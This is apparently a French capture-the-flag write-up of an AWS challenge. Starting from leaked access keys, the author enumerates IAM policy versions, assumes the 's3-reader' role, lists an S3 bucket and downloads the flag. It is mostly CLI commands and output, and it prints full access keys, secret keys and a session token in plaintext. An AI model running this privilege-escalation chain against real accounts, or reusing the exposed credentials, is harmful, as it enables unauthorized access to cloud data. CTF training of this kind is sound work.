
# Cloud : Alpha_Beta_Gamma...S3 2/2
**Challenge Author(s)**: SevenInside
**Difficulty**: Moyen

## 🎯  FLAG2

On vient de déclencher la fonction Lambda `GetPrivilegedAccess` avec succès et on a récupéré une nouvelle paire de clés AWS avec potentiellement plus de privilèges.

🚀 Mise à jour de la config AWS avec un nouveau profil et les nouveaux creds obtenus avec le flag1:


```bash
"AccessKeyId": "AKIA5Q6X6L6EPTLPKBFK",
"SecretAccessKey": "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"

```

```bash

[profile hit_priv]
region = eu-west-3
output = json
aws_access_key_id=AKIA5Q6X6L6EPTLPKBFK
aws_secret_access_key=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

```

***************

On assume le rôle:

```bash
root@HIT2025 ~ # aws sts get-caller-identity --profile hit_priv
{
    "UserId": "AIDA5Q6X6L6EAWKW76AWS",
    "Account": "929776426888",
    "Arn": "arn:aws:iam::929776426888:user/ctf-privileged-user"
}
```

*****************
On voit ce qu'on peut faire avec ce nouveau user/profile:

```bash
root@HIT2025 ~ # aws iam get-user --profile hit_priv
{
    "User": 
    {
        "Path": "/",
        "UserName": "ctf-privileged-user",
        "UserId": "AIDA5Q6X6L6EAWKW76AWS",
        "Arn": "arn:aws:iam::929776426888:user/ctf-privileged-user",
        "CreateDate": "2025-07-18T08:11:15+00:00",
        "Tags": [
            {
                "Key": "AKIA5Q6X6L6EPTLPKBFK",
                "Value": "Lambda-leak"
            }
        ]
    }
}
```

**********
🚀 Exploration des polices:

On trouve des infos ici avec notre arn:

```bash
root@HIT2025 ~ # aws iam get-policy --policy-arn arn:aws:iam::929776426888:policy/ctf-privileged-user-policy --profile hit_priv
{
    "Policy": {
        "PolicyName": "ctf-privileged-user-policy",
        "PolicyId": "ANPA5Q6X6L6EHOJWXHGJI",
        "Arn": "arn:aws:iam::929776426888:policy/ctf-privileged-user-policy",
        "Path": "/",
        "DefaultVersionId": "v3",
        "AttachmentCount": 1,
        "PermissionsBoundaryUsageCount": 0,
        "IsAttachable": true,
        "CreateDate": "2025-07-18T08:10:51+00:00",
        "UpdateDate": "2025-07-18T09:46:33+00:00",
        "Tags": []
    }
}
```

***

💡 On extrapole un peu plus loin en mentionnant la version (3) et on obtient bien plus de détails dont le fait que ce user peut assumer le rôle `s3-reader`!

```bash
root@HIT2025 ~ # aws iam get-policy-version --policy-arn arn:aws:iam::929776426888:policy/ctf-privileged-user-policy --version-id v3 --profile hit_priv
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Effect": "Allow",
                    "Action": [
                        "iam:GetUser",
                        "iam:ListAttachedUserPolicies",
                        "iam:ListRoles",
                        "iam:ListUserPolicies",
                        "iam:GetPolicy",
                        "iam:GetPolicyVersion"
                    ],
                    "Resource": [
                        "arn:aws:iam::*:user/ctf-privileged-user",
                        "arn:aws:iam::*:policy/ctf-privileged-user-policy"
                    ]
                },
                {
                    "Effect": "Allow",
                    "Action": [
                        "sts:AssumeRole"
                    ],
                    "Resource": "arn:aws:iam::*:role/s3-reader"
                }
            ]
        },
        "VersionId": "v3",
        "IsDefaultVersion": true,
        "CreateDate": "2025-07-18T09:46:33+00:00"
    }
}

```

******

On peut ensuite assumer le rôle de s3-reader:

```bash
root@HIT2025 ~ # aws sts assume-role --role-arn arn:aws:iam::929776426888:role/s3-reader --role-session-name S3ReaderSession --profile hit_priv

{
    "Credentials": {
        "AccessKeyId": "ASIA5Q6X6L6EEVOIDSZB",
        "SecretAccessKey": "Fg16bjIRekUT1VCYtOX+1NAdeqRcvDEUHuFbM52c",
        "SessionToken": "IQoJb3JpZ2luX2VjENb//////////wEaCWV1LXdlc3QtMyJHMEUCIC2sgC6kcY0WPXvpbwchDxiFYoHpxI8bm5H8EJQEsunaAiEAzHp4RqtskGV9im9EwgvlSKkT9tlrHlsBGTgG+y4Qol0qpQII7///////////ARAAGgw5Mjk3NzY0MjY4ODgiDPerLMxSOq8DAcmTeir5AWTeTgGDXkpMz/FfYTZnJawfJHXwFW9R7xKT439IvqslkKoO8hpXZ6cgC9xrqvppQ4EiJTEVJj2BiIgEhKpnIi/TOFynged6GJuHa7gxrv0qLyFiHtubW6ZKQbpid8uoIQvV4PGD8B1Viu9DjF2MyHq2uX3gBFoNpEyLTAXqcTdIOnkTtVfbuv6dYgZLbSHbfUMqy/JbENDsprTPV6HaRJKqg8hGm8oiw62oE1YgsG3hoohzklwcpeKPK1bwco6L+HavPVHA79+sPKcFRUTMKSh2MrNUPzYX3IdnCWpt4Kkl5pjOzUTxvsmQCRkKqWDmy+OqJ3GtUQHrTDDAuf7DBjqdARNJ83FA3g4JyutCPjtJeOn0jgvbZIbZgao6GUh0tGggtoI8na0+g7tEs85/i6vfvSvOh/5v3CfHkJI7vDHN2W2est5BbKyq4PHOFTv6Qyvz1+JtOixcsmw3wEy30QGnhZYIZ6S0qnKpeDW1BiMSYAcyUJoMWB//7EDl+qIX/ma5KcO1/jZixniYEVTQ3pKOrTVee8XzX+9uy1BypZ8=",
        "Expiration": "2025-07-22T15:14:24+00:00"
    },
    "AssumedRoleUser": {
        "AssumedRoleId": "AROA5Q6X6L6EBRZQA2J6N:S3ReaderSession",
        "Arn": "arn:aws:sts::929776426888:assumed-role/s3-reader/S3ReaderSession"
    }
}
```
_____________

On modifie la config AWS avec ces nouveaux credentials (dont ce token de session):

```bash
[profile hit]
region = eu-west-3
output = json
aws_access_key_id=AKIA5Q6X6L6EGQUEX4G4
aws_secret_access_key=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

[profile hit_priv]
region = eu-west-3
output = json
aws_access_key_id=AKIA5Q6X6L6EPTLPKBFK
aws_secret_access_key=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

[profile hit_s3]
region = eu-west-3
output = json
aws_access_key_id=ASIA5Q6X6L6EEVOIDSZB
aws_secret_access_key=Fg16bjIRekUT1VCYtOX+1NAdeqRcvDEUHuFbM52c
aws_session_token=IQoJb3JpZ2luX2VjENb//////////wEaCWV1LXdlc3QtMyJHMEUCIC2sgC6kcY0WPXvpbwchDxiFYoHpxI8bm5H8EJQEsunaAiEAzHp4RqtskGV9im9EwgvlSKkT9tlrHlsBGTgG+y4Qol0qpQII7///////////ARAAGgw5Mjk3NzY0MjY4ODgiDPerLMxSOq8DAcmTeir5AWTeTgGDXkpMz/FfYTZnJawfJHXwFW$
```

****

🔥 On tente de lister les buckets S3:


```bash
root@HIT2025 ~ # aws s3api list-buckets --profile hit_s3
{
    "Buckets": [
        {
            "Name": "hit-ctf-2025",
            "CreationDate": "2025-07-18T07:41:43+00:00"
        }
    ],
    "Owner": {
        "ID": "50bfa4f6fffe96c00975d4245dfb90d5fa2ec0dbce2053dfdc85ab7858745451"
    }
}
```
🏁 On a maintenant le nom du bucket et on peut lister le contenu:

```bash
root@HIT2025 ~ # aws s3 ls s3://hit-ctf-2025 --profile hit_s3
2025-07-18 09:44:54         36 flag-s3.txt
```

🎉 Puis download le flag:

```bash
root@HIT2025 ~ # aws s3 cp s3://hit-ctf-2025/flag-s3.txt . --profile hit_s3
download: s3://hit-ctf-2025/flag-s3.txt to ./flag-s3.txt

root@HIT2025 ~ # cat flag-s3.txt
hit{IAMAndLambdaServicesAreTricky!}
```

